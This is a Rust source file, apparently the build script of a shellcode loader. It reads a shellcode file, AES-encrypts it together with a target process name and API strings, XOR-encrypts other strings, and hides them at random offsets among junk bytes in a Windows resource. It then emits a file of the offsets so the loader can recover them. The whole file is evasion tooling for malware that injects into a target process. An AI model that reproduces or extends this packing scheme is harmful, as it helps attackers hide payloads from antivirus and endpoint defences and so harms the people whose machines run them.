use windows_sys::core::PCWSTR;
use windows_sys::Win32::Foundation::GetLastError;
use windows_sys::Win32::Security::Cryptography::{
    CryptAcquireContextW, CryptCreateHash, CryptDecrypt, CryptDeriveKey, CryptDestroyHash,
    CryptDestroyKey, CryptEncrypt, CryptGetKeyParam, CryptHashData, CryptReleaseContext,
    CryptSetKeyParam, CryptGenKey, ALG_CLASS_DATA_ENCRYPT, ALG_CLASS_HASH, ALG_SID_AES_256, ALG_SID_SHA_256,
    ALG_TYPE_ANY, ALG_TYPE_BLOCK, CRYPT_VERIFYCONTEXT, KP_BLOCKLEN, KP_IV, PROV_RSA_AES,KP_KEYLEN
};

use rand;
use rand::seq::SliceRandom;
use rand::Rng;
use std::fs;
use std::ops::Range;
use std::path::Path;

include!("build_config.rs");
include!("build_util.rs");

type BuildFn = fn(&mut ResourceGenerator, &mut Vec<u8>);

struct StringInfo {
    string_name: &'static str,
    encrypted: Vec<u8>,
    offset: usize,
}

struct XORStringInfo {
    string_name: &'static str,
    encrypted: Vec<u8>,
    offset: usize,
    key: Vec<u8>,
    key_offset: usize,
}

pub struct ResourceGenerator {
    aes_key: Vec<u8>,
    aes_key_offset: usize,
    aes_iv: Vec<u8>,
    aes_iv_offset: usize,
    target: Vec<u8>,
    target_offset: usize,
    shellcode: Vec<u8>,
    shellcode_offset: usize,
    string_info: Vec<StringInfo>,
    xor_string_info: Vec<XORStringInfo>,
}

impl ResourceGenerator {
    fn new() -> Self {
        let aes_iv = generate_random_bytes(get_iv_len());
        let aes_key = generate_random_bytes(get_key_len());

        let mut string_info = vec![];
        for string_name in AES_STRINGS {
            let encrypted = encrypt_bytes(string_name.as_bytes(), &aes_key, &aes_iv);
            string_info.push(StringInfo {
                string_name,
                encrypted,
                offset: usize::MAX,
            })
        }

        let mut xor_string_info = vec![];
        for string_name in XOR_STRINGS {
            let key = generate_random_bytes(string_name.len());
            let encrypted = xor_encrypt_bytes(string_name.as_bytes(), &key[..]);
            xor_string_info.push(XORStringInfo {
                string_name,
                encrypted,
                offset: usize::MAX,
                key,
                key_offset: usize::MAX,
            })
        }

        let target = encrypt_bytes(TARGET_PROCESS.as_bytes(), &aes_key, &aes_iv);

        let shellcode = encrypt_bytes(
            fs::read(SHELLCODE_PATH)
                .expect("Could not unwrap shellcode.")
                .as_slice(),
            &aes_key,
            &aes_iv,
        );

        ResourceGenerator {
            aes_key,
            aes_key_offset: 0,
            aes_iv,
            aes_iv_offset: 0,
            target,
            target_offset: 0,
            string_info,
            xor_string_info,
            shellcode,
            shellcode_offset: 0,
        }
    }

    fn add_string_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        let mut string_info = self.string_info.pop().expect("No string info to pop!");
        string_info.offset = payload.len();
        payload.extend(&string_info.encrypted);
        self.string_info.insert(0, string_info);
    }

    fn add_target_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        self.target_offset = payload.len();
        payload.extend(&self.target);
    }

    fn add_xor_string_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        let mut xor_string_info = self.xor_string_info.pop().expect("No string info to pop!");
        xor_string_info.offset = payload.len();
        payload.extend(&xor_string_info.encrypted);

        //put the key in after
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        xor_string_info.key_offset = payload.len();
        payload.extend(&xor_string_info.key);
        self.xor_string_info.insert(0, xor_string_info);
    }

    fn add_aes_key_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        self.aes_key_offset = payload.len();
        payload.extend(&self.aes_key);
    }

    fn add_aes_iv_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        self.aes_iv_offset = payload.len();
        payload.extend(&self.aes_iv);
    }

    fn add_shellcode_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        self.shellcode_offset = payload.len();
        payload.extend(&self.shellcode);
    }

    fn build_consts_file(&self) {
        let mut consts = vec![];

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "RESOURCE_ID", RESOURCE_ID
        ));

        consts.push(format!("pub const {}: usize = {:#X};", "RT_RCDATA", 10));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_KEY_POS", self.aes_key_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_KEY_LEN",
            self.aes_key.len()
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_IV_POS", self.aes_iv_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_IV_LEN",
            self.aes_iv.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "TARGET_POS", self.target_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "TARGET_LEN",
            self.target.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "SHELLCODE_POS", self.shellcode_offset
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "SHELLCODE_LEN",
            self.shellcode.len()
        ));

        for string in &self.string_info {
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_POS",
                string.offset
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_LEN",
                string.encrypted.len()
            ));
        }

        for string in &self.xor_string_info {
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_POS",
                string.offset
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_LEN",
                string.encrypted.len()
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_KEY",
                string.key_offset
            ));
        }

        fs::write("src/consts.rs", consts.join("\n")).expect("Could not write consts file.");
    }

    fn build_resource_file(&mut self) {
        self.string_info.shuffle(&mut rand::thread_rng());

        let mut functions: Vec<BuildFn> = vec![
            ResourceGenerator::add_aes_key_to_payload,
            ResourceGenerator::add_aes_iv_to_payload,
            ResourceGenerator::add_shellcode_to_payload,
            ResourceGenerator::add_target_to_payload,
        ];

        let mut i = self.string_info.len();
        while i > 0 {
            functions.push(ResourceGenerator::add_string_to_payload);
            i -= 1;
        }

        let mut i = self.xor_string_info.len();
        while i > 0 {
            functions.push(ResourceGenerator::add_xor_string_to_payload);
            i -= 1;
        }

        functions.shuffle(&mut rand::thread_rng());
        let mut payload = vec![];
        while !functions.is_empty() {
            (functions.pop().unwrap())(self, &mut payload)
        }

        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        if !Path::new("rsrc/").is_dir() {
            fs::create_dir("rsrc/").expect("Could not create directory");
        }
        fs::write(format!("rsrc/{}", RESOURCE_NAME), payload)
            .expect("Could not write payload file.");
    }
}
